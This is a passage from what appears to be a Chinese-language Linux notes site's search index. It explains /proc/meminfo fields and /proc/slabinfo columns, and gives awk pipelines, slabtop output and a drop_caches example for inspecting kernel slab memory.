\u670d\u52a1\u5668\u3001\u4f46\u662f\u5c1a\u672a\u88ab\u786e\u8ba4\uff08committed\uff09\u5199\u5165\u5230\u7a33\u5b9a\u5b58\u50a8\u7684\u9875\u8868 WritebackTmp Memory used by FUSE for temporary writeback buffers CommitLimit CommitLimit = ('vm.overcommit_ratio' * Physical RAM) Committed_AS The amount of memory presently allocated on the system.\uff08\u7cfb\u7edf\u4e2d\u76ee\u524d\u5206\u914d\u4e86\u7684\u5185\u5b58\uff1f\uff09 VmallocTotal vmalloc \u5185\u5b58\u5927\u5c0f VmallocUsed \u5df2\u88ab\u4f7f\u7528\u7684\u865a\u62df\u5185\u5b58\u5927\u5c0f VmallocChunk \u5728 vmalloc \u533a\u57df\u4e2d\u53ef\u7528\u7684\u6700\u5927\u7684\u8fde\u7eed\u5185\u5b58\u5757\u7684\u5927\u5c0f (45\u6761\u6d88\u606f) \u66fe\u6587\u658c: /proc/meminfo\u4e4b\u8c1c\u5b8c\u5168\u63ed\u79d8_Linux\u9605\u7801\u573a\u7684\u535a\u5ba2-CSDN\u535a\u5ba2","title":"/proc/meminfo"},{"location":"system/linux/%E5%86%85%E5%AD%98/0proc0slabinfo/","text":"/proc/slabtop \u7528/proc/slabinfo\u53ef\u4ee5\u5b9e\u73b0\u7b80\u5355\u7684slabtop $ cat /proc/slabinfo | grep -v \"^#\"|awk '$3!=0{print $1,$2,$3,$4}' | sort -k3nr | head -n 10 | awk '{print $1,$2,$3,(($2/$3)*100)\"%\",$4*$3/1024\"K\"}' # slab\u540d\u5b57 \u6b63\u5728\u4f7f\u7528\u7684\u5bf9\u8c61\u4e2a\u6570 \u603b\u7684\u5bf9\u8c61\u4e2a\u6570 \u6b63\u5728\u4f7f\u7528\u7684\u5bf9\u8c61\u767e\u5206\u6bd4 cache\u5927\u5c0f buffer_head 5726 18213 31.4391% 1849.76K kernfs_node_cache 17952 17952 100% 2103.75K dentry 11951 14700 81.2993% 2756.25K selinux_inode_security 11730 11730 100% 458.203K kmalloc-64 9477 10368 91.4062% 648K inode_cache 7346 7992 91.9169% 4620.38K shared_policy_node 5865 5865 100% 274.922K kmalloc-8 5120 5120 100% 40K kmalloc-16 4864 4864 100% 76K vm_area_struct 4046 4086 99.021% 861.891K #\u6216\u8005 $ cat /proc/slabinfo | grep -v \"^#\"|awk '$3!=0{print $1,$2,$3,$4}' | sort -k3nr | head -n 10 | awk '{print $1,\"\u6fc0\u6d3bobj\u4e2a\u6570=\"$2,\" \u603b\u5171obj\u4e2a\u6570\"$3,\" \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=\"(($2/$3)*100)\"%\",\"cache=\"$4,$4*$3/1024/1024\"M\"}' buffer_head \u6fc0\u6d3bobj\u4e2a\u6570=5726 \u603b\u5171obj\u4e2a\u657018213 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=31.4391% cache=104 1.8064M kernfs_node_cache \u6fc0\u6d3bobj\u4e2a\u6570=17952 \u603b\u5171obj\u4e2a\u657017952 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=100% cache=120 2.05444M dentry \u6fc0\u6d3bobj\u4e2a\u6570=11951 \u603b\u5171obj\u4e2a\u657014700 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=81.2993% cache=192 2.69165M selinux_inode_security \u6fc0\u6d3bobj\u4e2a\u6570=11730 \u603b\u5171obj\u4e2a\u657011730 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=100% cache=40 0.447464M kmalloc-64 \u6fc0\u6d3bobj\u4e2a\u6570=10143 \u603b\u5171obj\u4e2a\u657010432 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=97.2297% cache=64 0.636719M inode_cache \u6fc0\u6d3bobj\u4e2a\u6570=7346 \u603b\u5171obj\u4e2a\u65707992 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=91.9169% cache=592 4.51208M shared_policy_node \u6fc0\u6d3bobj\u4e2a\u6570=5865 \u603b\u5171obj\u4e2a\u65705865 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=100% cache=48 0.268478M kmalloc-8 \u6fc0\u6d3bobj\u4e2a\u6570=5120 \u603b\u5171obj\u4e2a\u65705120 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=100% cache=8 0.0390625M kmalloc-16 \u6fc0\u6d3bobj\u4e2a\u6570=4864 \u603b\u5171obj\u4e2a\u65704864 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=100% cache=16 0.0742188M vm_area_struct \u6fc0\u6d3bobj\u4e2a\u6570=4048 \u603b\u5171obj\u4e2a\u65704122 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=98.2048% cache=216 0.849106M $ slabtop Active / Total Objects (% used) : 121660 / 141528 (86.0%) Active / Total Slabs (% used) : 3998 / 3998 (100.0%) Active / Total Caches (% used) : 79 / 105 (75.2%) Active / Total Size (% used) : 26754.80K / 30372.41K (88.1%) Minimum / Average / Maximum Object : 0.01K / 0.21K / 8.00K OBJS ACTIVE USE OBJ SIZE SLABS OBJ/SLAB CACHE SIZE NAME 18213 5726 31% 0.10K 467 39 1868K buffer_head 17952 17952 100% 0.12K 528 34 2112K kernfs_node_cache 14700 11951 81% 0.19K 700 21 2800K dentry 11730 11730 100% 0.04K 115 102 460K selinux_inode_security 10368 9544 92% 0.06K 162 64 648K kmalloc-64 7992 7346 91% 0.58K 296 27 4736K inode_cache 5865 5865 100% 0.05K 69 85 276K shared_policy_node 5120 5120 100% 0.01K 10 512 40K kmalloc-8 4864 4864 100% 0.02K 19 256 76K kmalloc-16 4086 4086 100% 0.21K 227 18 908K vm_area_struct 4080 3570 87% 0.04K 40 102 160K ext4_extent_status 3024 3024 100% 0.09K 72 42 288K kmalloc-96 2856 2455 85% 0.08K 56 51 224K anon_vma 2800 1422 50% 0.57K 100 28 1600K radix_tree_node 2752 2752 100% 1.00K 172 16 2752K ext4_inode_cache 2064 1721 83% 0.25K 129 16 516K kmalloc-256 1920 1920 100% 0.03K 15 128 60K kmalloc-32 1659 1659 100% 0.19K 79 21 316K kmalloc-192 1624 1624 100% 0.07K 29 56 116K avc_node 1296 1261 97% 1.00K 81 16 1296K kmalloc-1024 1239 1016 82% 0.19K 59 21 236K cred_jar 1224 1076 87% 0.66K 51 24 816K shmem_inode_cache 1128 1128 100% 0.66K 47 24 752K proc_inode_cache /proc/slabinfo\u5404\u4e2a\u5217\u7684\u610f\u601d\u89e3\u91ca \u6bcf\u4e2a slab \u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u7269\u7406\u8fde\u7eed\u7684\u9875\u9762\u7ec4\u6210\uff0c\u6bcf\u4e2a cache \u7531\u4e00\u4e2a\u6216\u591a\u4e2a slab \u7ec4\u6210\uff0c\u6bcf\u4e2a\u5185\u6838\u6570\u636e\u7ed3\u6784\u90fd\u6709\u4e00\u4e2a cache\u3002cache\u4e2d\u53c8\u5305\u542b\u5bf9\u8c61\uff0c\u5bf9\u8c61\u53ef\u5206\u4e3a\u7a7a\u95f2\u548c\u4f7f\u7528\u4e24\u79cd\u72b6\u6001\u3002 slab \u5206\u914d\u5668\u9996\u5148\u5c1d\u8bd5\u5728\u90e8\u5206\u4e3a\u7a7a\u7684 slab \u4e2d\u7528\u7a7a\u95f2\u5bf9\u8c61\u6765\u6ee1\u8db3\u8bf7\u6c42\u3002\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u5219\u4ece\u7a7a\u7684 slab \u4e2d\u5206\u914d\u7a7a\u95f2\u5bf9\u8c61\u3002\u5982\u679c\u6ca1\u6709\u7a7a\u7684 slab \u53ef\u7528\uff0c\u5219\u4ece\u8fde\u7eed\u7269\u7406\u9875\u9762\u5206\u914d\u65b0\u7684 slab\uff0c\u5e76\u5c06\u5176\u5206\u914d\u7ed9 cache\uff1b\u4ece\u8fd9\u4e2a slab \u4e0a\uff0c\u518d\u5206\u914d\u5bf9\u8c61\u5185\u5b58\u3002 cat /proc/slabinfo slabinfo - version: 2.1 # name <active_objs> <num_objs> <objsize> <objperslab> <pagesperslab> : tunables <limit> <batchcount> <sharedfactor> : slabdata <active_slabs> <num_slabs> <sharedavail> dentry 16026 16863 192 21 1 : tunables 0 0 0 : slabdata 803 803 0 #\u6839\u636e\u4e0b\u9762\u7684\u5217\u89e3\u91ca\u8fdb\u884c\u6570\u503c\u9a8c\u8bc1\uff0cnum_objs\u4e3a16863\uff0cobjsize\u4e3a192B\uff0ccache\u603b\u5927\u5c0f\u4e3a16863*192=3237696B,\u4e00\u4e2aslab\u5927\u5c0f\u4e3a192*21=4032\uff08objsize*objperslab\uff09\uff0c4032/4096\u53d6\u6574\u4e3a1\uff0c\u5360\u7528\u4e00\u4e2a4K\u9875\uff0c\u5360\u7528slab\u4e2a\u6570\u4e3a(cache/\u4e00\u4e2aslab\u5927\u5c0f)3237696/4032=803\u4e2a\u3002 kmalloc-8192 25 28 8192 4 8 : tunables 0 0 0 : slabdata 7 7 0 #\u6839\u636e\u4e0b\u9762\u7684\u5217\u89e3\u91ca\u8fdb\u884c\u6570\u503c\u9a8c\u8bc1\uff0cnum_objs\u4e3a28\uff0cobjsize\u4e3a8192B\uff0ccache\u603b\u5927\u5c0f\u4e3a28*8192=229376B,\u4e00\u4e2aslab\u5927\u5c0f\u4e3a8192*4=32768\uff08objsize*objperslab\uff09\uff0c32768/4096=8\uff0c\u5360\u75288\u4e2a4K\u9875\uff0c\u5360\u7528slab\u4e2a\u6570\u4e3a(cache/\u4e00\u4e2aslab\u5927\u5c0f)229376/32768=7\u4e2a\u3002 active_objs \u5f53\u524d\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\uff08\u5373\u4f7f\u7528\u4e2d\uff09\u7684\u5bf9\u8c61\u6570\u3002 num_objs \u5bf9\u8c61\u7684\u603b\u6570\uff08\u5373\u6b63\u5728\u4f7f\u7528\u548c\u672a\u4f7f\u7528\u7684\u5bf9\u8c61\u3002 objsize \u5bf9\u8c61\u7684\u5927\u5c0f\uff0c\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u3002 objperslab \u4e00\u4e2aslab\u88ab\u5206\u6210\u4e86\u591a\u5c11\u4e2a\u5bf9\u8c61\uff0c\u7528\u8fd9\u4e2a\u53ef\u4ee5\u7b97\u51faslab\u7684\u57fa\u672c\u5927\u5c0f\uff0cobjsize*objperslab=slab \u5927\u5c0f pagesperslab \u4e00\u4e2aslab\u5360\u7528\u591a\u5c11\u4e2a4K\u9875\uff0c \u6bcf\u884c\u4e2d\u7684tunables\u6761\u76ee\u663e\u793a\u76f8\u5e94\u7f13\u5b58\u7684\u53ef\u8c03\u53c2\u6570\u3002\u4f7f\u7528\u9ed8\u8ba4SLUB\u5206\u914d\u5668\u65f6\uff0c\u6ca1\u6709\u53ef\u8c03\u9879\uff0c/proc/slabinfo\u6587\u4ef6\u4e0d\u53ef\u5199\uff0c\u5e76\u4e14\u8fd9\u4e9b\u5b57\u6bb5\u4e2d\u663e\u793a\u503c0\u3002\u4f7f\u7528\u8f83\u65e7\u7684SLAB\u5206\u914d\u5668\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u5c06\u4ee5\u4e0b\u5f62\u5f0f\u7684\u884c\u5199\u5165/proc/slabinfo\u6765\u8bbe\u7f6e\u7279\u5b9a\u7f13\u5b58\u7684\u53ef\u8c03\u9879 # echo 'name limit batchcount sharedfactor' > /proc/slabinfo \u8fd9\u91cc\uff0cname\u662f\u7f13\u5b58\u540d\u79f0\uff0climit\u3001batchcount\u548csharedfactor\u662f\u5b9a\u4e49\u76f8\u5e94\u53ef\u8c03\u53c2\u6570\u65b0\u503c\u7684\u6574\u6570\u3002\u9650\u5236\u503c\u5e94\u4e3a\u6b63\u503c\uff0cbatchcount\u5e94\u4e3a\u5c0f\u4e8e\u6216\u7b49\u4e8e\u9650\u5236\u7684\u6b63\u503c\uff0csharedfactor\u5e94\u4e3a\u975e\u8d1f\u503c\u3002\u5982\u679c\u6307\u5b9a\u7684\u4efb\u4f55\u503c\u65e0\u6548\uff0c\u5219\u7f13\u5b58\u8bbe\u7f6e\u4fdd\u6301\u4e0d\u53d8\u3002 #tunables \u6bcf\u884c\u4e2d\u7684\u53ef\u8c03\u9879\u5305\u542b\u4ee5\u4e0b\u5b57\u6bb5\uff1a limit \u5c06\u7f13\u5b58\u7684\u6700\u5927\u5bf9\u8c61\u6570\u3002 batchcount \u5728SMP\u7cfb\u7edf\u4e0a\uff0c\u8fd9\u6307\u5b9a\u4e86\u5728\u91cd\u65b0\u586b\u5145\u53ef\u7528\u5bf9\u8c61\u5217\u8868\u65f6\u4e00\u6b21\u8981\u4f20\u8f93\u7684\u5bf9\u8c61\u6570\u3002 sharedfactor \u5f85\u8bb0\u5f55 #\u6bcf\u884c\u4e2d\u7684slabdata\u6761\u76ee\u5305\u542b\u4ee5\u4e0b\u5b57\u6bb5\uff1a active_slabs \u6fc0\u6d3b\u7684 objperslab \u591a\u5c11\u4e2a nums_slabs \u5360\u7528\u7684 objperslab \u591a\u5c11\u4e2a sharedavail [\u5f85\u8bb0\u5f55] #\u884c\u9996\u7684 slabinfo - version: 2.1 #1.0 \u5728\u6574\u4e2a Linux 2.2.x \u5185\u6838\u7cfb\u5217\u4e2d\u90fd\u5b58\u5728\u3002 #1.1 \u51fa\u73b0\u5728 Linux 2.4.x \u5185\u6838\u7cfb\u5217\u4e2d\u3002 #1.2 Linux 2.5\u5f00\u53d1\u7cfb\u5217\u4e2d\u7b80\u8981\u4ecb\u7ecd\u7684\u4e00\u79cd\u683c\u5f0f\u3002 #2.0 \u5b58\u5728\u4e8e Linux 2.6.x \u5185\u6838\u4e2d\uff0c\u5305\u62ec Linux 2.6.9\u3002 #2.1 \u76ee\u524d\u7684\u683c\u5f0f\uff0c\u6700\u65e9\u51fa\u73b0\u5728Linux 2.6.10 \u89e3\u91caslabtop\u547d\u4ee4 [root@VM-0-16-centos ~]# slabtop Active / Total Objects (% used) : 210181 / 216239 (97.2%) Active / Total Slabs (% used) : 7921 / 7921 (100.0%) Active / Total Caches (% used) : 74 / 105 (70.5%) Active / Total Size (% used) : 69560.35K / 71380.84K (97.4%) Minimum / Average / Maximum Object : 0.01K / 0.33K / 8.00K OBJS ACTIVE USE OBJ SIZE SLABS OBJ/SLAB CACHE SIZE NAME 49728 49728 100% 0.19K 2368 21 9472K dentry 28 25 89% 8.00K 7 4 224K kmalloc-8192 OBJS \u2014 The total number of objects (memory blocks), including those in use (allocated), and some spares not in use. \u5bf9\u8c61\u7684\u603b\u6570 ACTIVE \u2014 The number of objects (memory blocks) that are in use (allocated). \u6b63\u5728\u4f7f\u7528\u7684\u5bf9\u8c61\u6570\u3002 USE \u2014 Percentage of total objects that are active. \u6d3b\u52a8\u5bf9\u8c61\u603b\u6570\u7684\u767e\u5206\u6bd4 \u3002((ACTIVE/OBJS)(100)) OBJ SIZE \u2014 The size of the objects. \u5bf9\u8c61\u7684\u5927\u5c0f\u3002\uff08\u5bf9\u5e94/proc/slabinfo\u4e2d <objsize> \uff09 SLABS \u2014 The total number of slabs. slabs\u7684\u4e2a\u6570\u3002\uff08slab\u7684\u4e2a\u6570\uff0c\u5bf9\u5e94/proc/slabinfo\u4e2d\u7684nums_slabs\uff09 OBJ/SLAB \u2014 The number of objects that fit into a slab. slab\u4e2d\u7684\u5bf9\u8c61\u6570\u3002\uff08\u4e00\u4e2aslab\u4e2d\u591a\u5c11\u4e2a\u5bf9\u8c61\uff09 CACHE SIZE \u2014 The cache size of the slab. \u5bf9\u8c61\u7f13\u5b58\u5927\u5c0f(\u6211\u53d1\u73b0\u8fd9\u4e2a\u503c\u5927\u5c0f\u6b63\u597d\u7b49\u4e8eOBJS\u4e58\u4ee5OBJ SIZE\uff0c\u5728/proc/slabinfo\u4e2d\uff0c <num_objs> \u4e58\u4ee5 <objsize> ) NAME \u2014 The name of the slab. slab\u7684\u540d\u79f0 \u91ca\u653edentry\u548cinode\u5bf9\u8c61 echo 3 > /proc/sys/vm/drop_caches $ cat /proc/slabinfo | grep -v \"^#\"|awk '$3!=0{print $1,$2,$3,$4}' | sort -k3nr | head -n 10 | awk '{print $1,$2,$3,(($2/$3)*100)\"%\",$4*$3/1024\"K\"}' # slab\u540d\u5b57 \u6b63\u5728\u4f7f\u7528\u7684\u5bf9\u8c61\u4e2a\u6570 \u603b\u7684\u5bf9\u8c61\u4e2a\u6570 \u6b63\u5728\u4f7f\u7528\u7684\u5bf9\u8c61\u767e\u5206\u6bd4 cache\u5927\u5c0f dentry 49959 49959 100% 9367.31K ext4_inode_cache 36096 36096 100% 36096K buffer_head 26871 26871 100% 2729.09K kernfs_node_cache 17884 17952 99.6212% 2103.75K selinux_inode_security 9465 10506 90.0914% 410.391K kmalloc-64 9786 10304 94.9728% 644K inode_cache 9882 9882 100% 5713.03K ext4_extent_status 8262 8262 100% 322.734K kmalloc-8 5120 5120 100% 40K kmalloc-16 4718 4864 96.9984% 76K $ echo 3 > /proc/sys/vm/drop_caches $ cat /proc/slabinfo | grep -v \"^#\"|awk '$3!=0{print $1,$2,$3,$4}' | sort -k3nr | head -n 10 | awk '{print $1,$2,$3,(($2/$3)*100)\"%\",$4*$3/1024\"K\"}' buffer_head 5426 18837 28.805% 1913.13K kernfs_node_cache 17884 17952 99.6212% 2103.75K dentry 9278 14826 62.5793% 2779.88K selinux_inode_security 9465 10506 90.0914% 410.391K kmalloc-64 9311 10240 90.9277% 640K inode_cache 7608 8424 90.3134% 4870.12K kmalloc-8 5120 5120 100% 40K kmalloc-16 4718 4864 96.9984% 76K vm_area_struct 4075 4122 98.8598% 869.484K shared_policy_node 3656 3995 91.5144% 187.266K \u8d44\u6599\uff1a https://man7.org/linux/man-pages/man5/slabinfo.5.html https://man7.org/linux/man-pages/man1/slabtop.1.htm https://www.kernel.org/doc/man-pages/","title":"/proc/slabinfo"},{"location":"system/linux/%E5%86%85%E5%AD%98/0proc0slabinfo/#procslabtop","text":"","title":"/proc/slabtop"},{"location":"system/linux/%E5%86%85%E5%AD%98/0proc0slabinfo/#procslabinfoslabtop","text":"$ cat /proc/slabinfo | grep -v \"^#\"|awk '$3!=0{print $1,$2,$3,$4}' | sort -k3nr | head -n 10 | awk '{print $1,$2,$3,(($2/$3)*100)\"%\",$4*$3/1024\"K\"}' # slab\u540d\u5b57 \u6b63\u5728\u4f7f\u7528\u7684\u5bf9\u8c61\u4e2a\u6570 \u603b\u7684\u5bf9\u8c61\u4e2a\u6570 \u6b63\u5728\u4f7f\u7528\u7684\u5bf9\u8c61\u767e\u5206\u6bd4 cache\u5927\u5c0f buffer_head 5726 18213 31.4391% 1849.76K kernfs_node_cache 17952 17952 100% 2103.75K dentry 11951 14700 81.2993% 2756.25K selinux_inode_security 11730 11730 100% 458.203K kmalloc-64 9477 10368 91.4062% 648K inode_cache 7346 7992 91.9169% 4620.38K shared_policy_node 5865 5865 100% 274.922K kmalloc-8 5120 5120 100% 40K kmalloc-16 4864 4864 100% 76K vm_area_struct 4046 4086 99.021% 861.891K #\u6216\u8005 $ cat /proc/slabinfo | grep -v \"^#\"|awk '$3!=0{print $1,$2,$3,$4}' | sort -k3nr | head -n 10 | awk '{print $1,\"\u6fc0\u6d3bobj\u4e2a\u6570=\"$2,\" \u603b\u5171obj\u4e2a\u6570\"$3,\" \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=\"(($2/$3)*100)\"%\",\"cache=\"$4,$4*$3/1024/1024\"M\"}' buffer_head \u6fc0\u6d3bobj\u4e2a\u6570=5726 \u603b\u5171obj\u4e2a\u657018213 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=31.4391% cache=104 1.8064M kernfs_node_cache \u6fc0\u6d3bobj\u4e2a\u6570=17952 \u603b\u5171obj\u4e2a\u657017952 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=100% cache=120 2.05444M dentry \u6fc0\u6d3bobj\u4e2a\u6570=11951 \u603b\u5171obj\u4e2a\u657014700 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=81.2993% cache=192 2.69165M selinux_inode_security \u6fc0\u6d3bobj\u4e2a\u6570=11730 \u603b\u5171obj\u4e2a\u657011730 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=100% cache=40 0.447464M kmalloc-64 \u6fc0\u6d3bobj\u4e2a\u6570=10143 \u603b\u5171obj\u4e2a\u657010432 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=97.2297% cache=64 0.636719M inode_cache \u6fc0\u6d3bobj\u4e2a\u6570=7346 \u603b\u5171obj\u4e2a\u65707992 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=91.9169% cache=592 4.51208M shared_policy_node \u6fc0\u6d3bobj\u4e2a\u6570=5865 \u603b\u5171obj\u4e2a\u65705865 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=100% cache=48 0.268478M kmalloc-8 \u6fc0\u6d3bobj\u4e2a\u6570=5120 \u603b\u5171obj\u4e2a\u65705120 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=100% cache=8 0.0390625M kmalloc-16 \u6fc0\u6d3bobj\u4e2a\u6570=4864 \u603b\u5171obj\u4e2a\u65704864 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=100% cache=16 0.0742188M vm_area_struct \u6fc0\u6d3bobj\u4e2a\u6570=4048 \u603b\u5171obj\u4e2a\u65704122 \u4e2a\u6570\u5360\u7528\u767e\u5206\u6bd4=98.2048% cache=216 0.849106M $ slabtop Active / Total Objects (% used) : 121660 / 141528 (86.0%) Active / Total Slabs (% used) : 3998 / 3998 (100.0%) Active / Total Caches (% used) : 79 / 105 (75.2%) Active / Total Size (% used) : 26754.80K / 30372.41K (88.1%) Minimum / Average / Maximum Object : 0.01K / 0.21K / 8.00K OBJS ACTIVE USE OBJ SIZE SLABS OBJ/SLAB CACHE SIZE NAME 18213 5726 31% 0.10K 467 39 1868K buffer_head 17952 17952 100% 0.12K 528 34 2112K kernfs_node_cache 14700 11951 81% 0.19K 700 21 2800K dentry 11730 11730 100% 0.04K 115 102 460K selinux_inode_security 10368 9544 92% 0.06K 162 64 648K kmalloc-64 7992 7346 91% 0.58K 296 27 4736K inode_cache 5865 5865 100% 0.05K 69 85 276K shared_policy_node 5120 5120 100% 0.01K 10 512 40K kmalloc-8 4864 4864 100% 0.02K 19 256 76K kmalloc-16 4086 4086 100% 0.21K 227 18 908K vm_area_struct 4080 3570 87% 0.04K 40 102 160K ext4_extent_status 3024 3024 100% 0.09K 72 42 288K kmalloc-96 2856 2455 85% 0.08K 56 51 224K anon_vma 2800 1422 50% 0.57K 100 28 1600K radix_tree_node 2752 2752 100% 1.00K 172 16 2752K ext4_inode_cache 2064 1721 83% 0.25K 129 16 516K kmalloc-256 1920 1920 100% 0.03K 15 128 60K kmalloc-32 1659 1659 100% 0.19K 79 21 316K kmalloc-192 1624 1624 100% 0.07K 29 56 116K avc_node 1296 1261 97% 1.00K 81 16 1296K kmalloc-1024 1239 1016 82% 0.19K 59 21 236K cred_jar 1224 1076 87% 0.66K 51 24 816K shmem_inode_cache 1128 1128 100% 0.66K 47 24 752K proc_inode_cache","title":"\u7528/proc/slabinfo\u53ef\u4ee5\u5b9e\u73b0\u7b80\u5355\u7684slabtop"},{"location":"system/linux/%E5%86%85%E5%AD%98/0proc0slabinfo/#procslabinfo","text":"\u6bcf\u4e2a slab \u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u7269\u7406\u8fde\u7eed\u7684\u9875\u9762\u7ec4\u6210\uff0c\u6bcf\u4e2a cache \u7531\u4e00\u4e2a\u6216\u591a\u4e2a slab \u7ec4\u6210\uff0c\u6bcf\u4e2a\u5185\u6838\u6570\u636e\u7ed3\u6784\u90fd\u6709\u4e00\u4e2a cache\u3002cache\u4e2d\u53c8\u5305\u542b\u5bf9\u8c61\uff0c\u5bf9\u8c61\u53ef\u5206\u4e3a\u7a7a\u95f2\u548c\u4f7f\u7528\u4e24\u79cd\u72b6\u6001\u3002 slab \u5206\u914d\u5668\u9996\u5148\u5c1d\u8bd5\u5728\u90e8\u5206\u4e3a\u7a7a\u7684 slab \u4e2d\u7528\u7a7a\u95f2\u5bf9\u8c61\u6765\u6ee1\u8db3\u8bf7\u6c42\u3002\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u5219\u4ece\u7a7a\u7684 slab \u4e2d\u5206\u914d\u7a7a\u95f2\u5bf9\u8c61\u3002\u5982\u679c\u6ca1\u6709\u7a7a\u7684 slab \u53ef\u7528\uff0c\u5219\u4ece\u8fde\u7eed\u7269\u7406\u9875\u9762\u5206\u914d\u65b0\u7684 slab\uff0c\u5e76\u5c06\u5176\u5206\u914d\u7ed9 cache\uff1b\u4ece\u8fd9\u4e2a slab \u4e0a\uff0c\u518d\u5206\u914d\u5bf9\u8c61\u5185\u5b58\u3002 cat /proc/slabinfo slabinfo - version: 2.1 # name <active_objs> <num_objs> <objsize> <objperslab> <pagesperslab> : tunables <limit> <batchcount> <sharedfactor> : slabdata <active_slabs> <num_slabs> <sharedavail> dentry 16026 16863 192 21 1 : tunables 0 0 0 : slabdata 803 803 0 #\u6839\u636e\u4e0b\u9762\u7684\u5217\u89e3\u91ca\u8fdb\u884c\u6570\u503c\u9a8c\u8bc1\uff0cnum_objs\u4e3a16863\uff0cobjsize\u4e3a192B\uff0ccache\u603b\u5927\u5c0f\u4e3a16863*192=3237696B,\u4e00\u4e2aslab\u5927\u5c0f\u4e3a192*21=4032\uff08objsize*objperslab\uff09\uff0c4032/4096\u53d6\u6574\u4e3a1\uff0c\u5360\u7528\u4e00\u4e2a4K\u9875\uff0c\u5360\u7528slab\u4e2a\u6570\u4e3a(cache/\u4e00\u4e2aslab\u5927\u5c0f)3237696/4032=803\u4e2a\u3002 kmalloc-8192 25 28 8192 4 8 : tunables 0 0 0 : slabdata 7 7 0 #\u6839\u636e\u4e0b\u9762\u7684\u5217\u89e3\u91ca\u8fdb\u884c\u6570\u503c\u9a8c\u8bc1\uff0cnum_objs\u4e3a28\uff0cobjsize\u4e3a8192B\uff0ccache\u603b\u5927\u5c0f\u4e3a28*8192=229376B,\u4e00\u4e2aslab\u5927\u5c0f\u4e3a8192*4=32768\uff08objsize*objperslab\uff09\uff0c32768/4096=8\uff0c\u5360\u75288\u4e2a4K\u9875\uff0c\u5360\u7528slab\u4e2a\u6570\u4e3a(cache/\u4e00\u4e2aslab\u5927\u5c0f)229376/32768=7\u4e2a\u3002 active_objs \u5f53\u524d\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\uff08\u5373\u4f7f\u7528\u4e2d\uff09\u7684\u5bf9\u8c61\u6570\u3002 num_objs \u5bf9\u8c61\u7684\u603b\u6570\uff08\u5373\u6b63\u5728\u4f7f\u7528\u548c\u672a\u4f7f\u7528\u7684\u5bf9\u8c61\u3002 objsize \u5bf9\u8c61\u7684\u5927\u5c0f\uff0c\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u3002 objperslab \u4e00\u4e2aslab\u88ab\u5206\u6210\u4e86\u591a\u5c11\u4e2a\u5bf9\u8c61\uff0c\u7528\u8fd9\u4e2a\u53ef\u4ee5\u7b97\u51faslab\u7684\u57fa\u672c\u5927\u5c0f\uff0cobjsize*objperslab=slab \u5927\u5c0f pagesperslab \u4e00\u4e2aslab\u5360\u7528\u591a\u5c11\u4e2a4K\u9875\uff0c \u6bcf\u884c\u4e2d\u7684tunables\u6761\u76ee\u663e\u793a\u76f8\u5e94\u7f13\u5b58\u7684\u53ef\u8c03\u53c2\u6570\u3002\u4f7f\u7528\u9ed8\u8ba4SLUB\u5206\u914d\u5668\u65f6\uff0c\u6ca1\u6709\u53ef\u8c03\u9879\uff0c/proc/slabinfo\u6587\u4ef6\u4e0d\u53ef\u5199\uff0c\u5e76\u4e14\u8fd9\u4e9b\u5b57\u6bb5\u4e2d\u663e\u793a\u503c0\u3002\u4f7f\u7528\u8f83\u65e7\u7684SLAB\u5206\u914d\u5668\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u5c06\u4ee5\u4e0b\u5f62\u5f0f\u7684\u884c\u5199\u5165/proc/slabinfo\u6765\u8bbe\u7f6e\u7279\u5b9a\u7f13\u5b58\u7684\u53ef\u8c03\u9879 # echo 'name limit batchcount sharedfactor' > /proc/slabinfo \u8fd9\u91cc\uff0cname\u662f\u7f13\u5b58\u540d\u79f0\uff0climit\u3001batchcount\u548csharedfactor\u662f\u5b9a\u4e49\u76f8\u5e94\u53ef\u8c03\u53c2\u6570\u65b0\u503c\u7684\u6574\u6570\u3002\u9650\u5236\u503c\u5e94\u4e3a\u6b63\u503c\uff0cbatchcount\u5e94\u4e3a\u5c0f\u4e8e\u6216\u7b49\u4e8e\u9650\u5236\u7684\u6b63\u503c\uff0csharedfactor\u5e94\u4e3a\u975e\u8d1f\u503c\u3002\u5982\u679c\u6307\u5b9a\u7684\u4efb\u4f55\u503c\u65e0\u6548\uff0c\u5219\u7f13\u5b58\u8bbe\u7f6e\u4fdd\u6301\u4e0d\u53d8\u3002 #tunables \u6bcf\u884c\u4e2d\u7684\u53ef\u8c03\u9879\u5305\u542b\u4ee5\u4e0b\u5b57\u6bb5\uff1a limit \u5c06\u7f13\u5b58\u7684\u6700\u5927\u5bf9\u8c61\u6570\u3002 batchcount \u5728SMP\u7cfb\u7edf\u4e0a\uff0c\u8fd9\u6307\u5b9a\u4e86\u5728\u91cd\u65b0\u586b\u5145\u53ef\u7528\u5bf9\u8c61\u5217\u8868\u65f6\u4e00\u6b21\u8981\u4f20\u8f93\u7684\u5bf9\u8c61\u6570\u3002 sharedfactor \u5f85\u8bb0\u5f55 